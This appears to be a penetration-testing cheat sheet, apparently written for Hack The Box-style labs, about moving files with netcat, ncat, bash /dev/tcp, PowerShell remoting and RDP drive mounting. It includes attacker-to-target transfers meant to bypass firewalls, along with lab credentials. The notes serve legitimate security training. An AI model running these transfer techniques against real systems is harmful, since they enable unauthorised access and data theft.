### Netcat Send

**Netcat - Receive**
`nc -l -p 8000 > out.file`

**Ncat - Receive**
`ncat -l -p 8000 --recv-only > out.file`

**Netcat - Send**
`nc -q 0 <IP> 8000 < in.file`

**Ncat - Send**
`ncat --send-only <IP> 8000 < in.file`


### Netacat "Reverse Send"

- If a firewall is blocking inbound connetions we can connect out from the target to download.

**Netcat Host on Attacker**
`sudo nc -l -p 443 -q 0 < in.file`

**Netcat Connect from Target**
`nc <IP> 443 > out.file`

**Ncat Host on Attacker**
`sudo ncat -l -p 443 --send-only < in.file`

**Ncat Connect from Target**
`ncat <IP> 443 --recv-only > out.file`

- If the target doesn't have netcat or ncat we can use Bash `/dev/tcp`
1. Host locally like above
2. Connect to attacker box with bash to download
	- `cat < /dev/tcp/IP/PORT > out.file`

### PowerShell Session File Transfer
- Uses [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)
- Requires Admin or Remote Management Group membership or explicit permissions for Powershell Remoting in the session config.
- Uses TCP 5985 for HTTP and 5986 for HTTPs (WinRM)

For this example: We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled.

1. Confirm WinRM port TCP 5985 is open
	- `Test-NetConnection -ComputerName DATABASE01 -Port 5985`
2. Create a PowerShell Remoting Session to DATABASE1
	- `$Session = New-PSSession -ComputerName DATABASE01`
3. Copy DATABASE.txt from DATABASE01 to our Localhost
	- `Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

### RDP
- We can transfer files using RDP by copying and pasting.
	- This should also work from linux in xfreerdp or rdesktop
- As an alternative we can mount a local resource on the target RDP server.

- **Mounting a Linux Folder Using rdesktop**
	- `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`

- **Mounting a Linux Folder Using xfreerdp**
	- `xfreerdp /v:10.10.10.132 /d:<DOMAIN> /u:administrator /p:'Password0@' /drive:<NAME>,/path/to/folder`

- Once mounted, we can connect to `\\tsclient\` on Windows allowing us to transfer files inside the rdp session.